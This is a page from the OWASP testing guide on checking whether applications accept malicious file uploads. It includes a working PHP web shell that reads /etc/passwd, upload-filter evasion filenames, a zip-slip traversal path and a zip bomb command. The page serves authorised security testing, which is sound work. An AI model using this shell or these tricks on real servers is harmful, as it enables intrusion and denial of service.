# Test Upload of Malicious Files

|ID               |
|-----------------|
|WSTG-BUSL-09|

## Summary

Many application’s business processes allow for the upload of data/information. We regularly check the validity and security of text but accepting files can introduce even more risk. To reduce the risk we may only accept certain file extensions, but attackers are able to encapsulate malicious code into inert file types. Testing for malicious files verifies that the application/system is able to correctly protect against attackers uploading malicious files.

Vulnerabilities related to the uploading of malicious files is unique in that these “malicious” files can easily be rejected through including business logic that will scan files during the upload process and reject those perceived as malicious. Additionally, this is different from uploading unexpected files in that while the file type may be accepted the file may still be malicious to the system.

Finally, “malicious” means different things to different systems, for example Malicious files that may exploit SQL server vulnerabilities may not be considered a “malicious” to a main frame flat file environment.

The application may allow the upload of malicious files that include exploits or shellcode without submitting them to malicious file scanning. Malicious files could be detected and stopped at various points of the application architecture such as: IPS/IDS, application server anti-virus software or anti-virus scanning by application as files are uploaded (perhaps offloading the scanning using SCAP).

## Example

A common example of this vulnerability is an application such as a blog or forum that allows users to upload images and other media files. While these are considered safe, if an attacker is able to upload executable code (such as a PHP script), this could allow them to execute operating system commands, read and modify information in the filesystem, access the back end database and fully compromise the server.

## How to Test

### Generic Testing Method

- Identify the file upload functionality.
- Review the project documentation to identify what types of files are considered acceptable, and what types would be considered dangerous or malicious.
- Determine how the uploaded files are processed.
- Obtain or create a set of "malicious" files for testing.
- Try to upload the "malicious" files to the application and determine whether it is accepted and processed.

### Malicious Files

Applications should generally scan uploaded files with anti-malware software to ensure that they do not contain anything malicious. The easiest way to test for this is using the [EICAR test file](https://www.eicar.org/?page_id=3950), which is an safe file that is flagged as malicious by all anti-malware software.

Depending on the type of application, it may be necessary to test for other dangerous file types, such as Office documents containing malicious macros. Tools such as the [Metasploit Framework](https://github.com/rapid7/metasploit-framework) can be used to generate malicious files for various formats.

When this file is uploaded, it should be detected and quarantined or deleted by the application. Depending on how the application processes the file, it may not be obvious whether this has taken place.

### Web Shells

If the server is configured to execute code, then it may be possible to obtain command execution on the server by uploading a file known as a web shell, which allows you to execute arbitrary code or operating system commands. In order for this attack to be successful, the file needs to be uploaded inside the webroot, and the server must be configured to execute the code.

Uploading this kind of shell onto an Internet facing server is dangerous, because it allows anyone who knows (or guesses) the location of the shell to execute code on the server. A number of techniques can be used to protect the shell from unauthorised access, such as:

- Uploading the shell with a randomly generated name.
- Password protecting the shell.
- Implementing IP based restrictions on the shell.

The example below shows a simple PHP based shell, that executes operating system commands passed to it in a GET parameter, and can only be accessed from a specific IP address:

```php
<?php
    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
        if(isset($_REQUEST['cmd'])){
            $cmd = ($_REQUEST['cmd']);
            echo "<pre>\n";
            system($cmd);
            echo "</pre>";
        }
    }
?>
```

Once the shell is uploaded (with a random name), you can execute operating system commands by passing them in the "cmd" GET parameter:

`https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd`

**Remember to remove the shell when you are done.**

### Invalid File

- Set up the intercepting proxy to capture the “valid” request for an accepted file.
- Send an “invalid” request through with a valid/acceptable file extension and see if the request is accepted or properly rejected.

### Source Code Review

When there is file upload feature supported, the following API/methods are common to be found in the source code.

- Java: `new file`, `import`, `upload`, `getFileName`, `Download`, `getOutputString`
- C/C++: `open`, `fopen`
- PHP: `move_uploaded_file()`, `Readfile`, `file_put_contents()`, `file()`, `parse_ini_file()`, `copy()`, `fopen()`, `include()`, `require()`

### Evasion of the Filter

The following techniques may be used to bypass the website file upload checking rules and filters, particularly if they are written using a blacklisting approach:

- Change the value of `Content-Type` as `image/jpeg` in HTTP request.
- Change the extensions to a less common extension, such as `file.php5`, `file.shtml`, `file.asa`, `file.jsp`, `file.jspx`, `file.aspx`, `file.asp`, `file.phtml`, `file.cshtml`
- Change the capitalisation of the extension, such as `file.PhP` or `file.AspX`
- Using special trailing characters such as spaces, dots or null characters such as `file.asp...`, `file.php;jpg`, `file.asp%00.jpg`, `1.jpg%00.php`
- In old versions of IIS 6, if the filename is `file.asp;file.jpg`, the file may be executed as `file.asp`:
- In old or badly configured versions of nginx, uploading a file as `test.jpg/x.php` may allow it to be executed as `x.php`.

### Archive Directory Traversal

If the application extracts archives (such as Zip files), then it may be possible to write to unintended locations using directory traversal. This can be exploited by uploading a malicious zip file that contains paths that traverse the file system using sequences such as `..\..\..\..\shell.php`. This technique is discussed further in the [snyk advisory](https://snyk.io/research/zip-slip-vulnerability).

### Zip Bombs

A [Zip bomb](https://en.wikipedia.org/wiki/Zip_bomb) (more generally known as a decompression bomb) is an archive file that contains a large volume of data. It's intended to cause a denial of service by exhausting the disk space or memory of the target system that tries to extract the archive. Note that although the Zip format is the most example of this, other formats are also affected, including gzip (which is frequently used to compress data in transit).

At its simplest level, a Zip bomb can be created by compressing a large file consisting of a single character. The example below shows how to create a 1MB file that will decompress to 1GB:

```bash
dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
```

There are a number of methods that can be used to achieve much higher compression ratios, including multiple levels of compression, [abusing the Zip format](https://www.bamsoftware.com/hacks/zipbomb/) and [quines](https://research.swtch.com/zip) (which are archives that contain a copy of themselves, causing infinite recursion).

A successful Zip bomb attack will result in a denial of service, and can also lead to increased costs if an auto-scaling cloud platform is used. **Do not carry out this kind of attack unless you have considered these risks and have written approval to do so.**

## Related Test Cases

- [Test File Extensions Handling for Sensitive Information](../02-Configuration_and_Deployment_Management_Testing/03-Test_File_Extensions_Handling_for_Sensitive_Information.md)
- [Test Upload of Unexpected File Types](08-Test_Upload_of_Unexpected_File_Types.md)

## Tools

- Metasploit's payload generation functionality
- Intercepting proxy

## References

- [OWASP - Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Why File Upload Forms are a Major Security Threat](https://www.acunetix.com/websitesecurity/upload-forms-threat/)
- [Overview of Malicious File Upload Attacks](http://securitymecca.com/article/overview-of-malicious-file-upload-attacks/)
- [8 Basic Rules to Implement Secure File Uploads](https://software-security.sans.org/blog/2009/12/28/8-basic-rules-to-implement-secure-file-uploads)
- [Stop people uploading malicious PHP files via forms](https://stackoverflow.com/questions/602539/stop-people-uploading-malicious-php-files-via-forms)
- [How to Tell if a File is Malicious](https://www.techsupportalert.com/content/how-tell-if-file-malicious.htm)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [Implementing Secure File Upload](https://infosecauditor.wordpress.com/tag/malicious-file-upload/)
- [Metasploit Generating Payloads](https://www.offensive-security.com/metasploit-unleashed/Generating_Payloads)

## Remediation

While safeguards such as blacklisting or whitelisting of file extensions, using “Content-Type” from the header, or using a file type recognizer may not always be protections against this type of vulnerability. Every application that accepts files from users must have a mechanism to verify that the uploaded file does not contain malicious code. Uploaded files should never be stored where the users or attackers can directly access them.
